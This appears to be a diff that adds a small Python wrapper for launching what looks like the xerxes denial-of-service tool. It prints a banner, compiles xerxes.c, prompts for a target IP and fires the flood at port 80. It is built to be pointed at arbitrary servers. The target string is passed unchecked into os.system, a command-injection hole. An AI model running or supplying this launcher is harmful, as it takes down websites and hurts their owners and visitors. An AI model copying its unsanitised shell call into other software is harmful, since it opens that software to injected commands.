@@ -1,0 +1,10 @@
+import os
+os.system("clear")
+print("           ╔══════════════════════════╗")  
+print("                     ▄︻┻┳═一")
+print("                Edit by Nattawut. ")
+print("           ╚══════════════════════════╝")
+os.system("chmod +x xerxes.c")
+os.system("gcc xerxes.c -o xerxes")
+a = input("\n IP : ")
+os.system("./xerxes "+a+" 80")
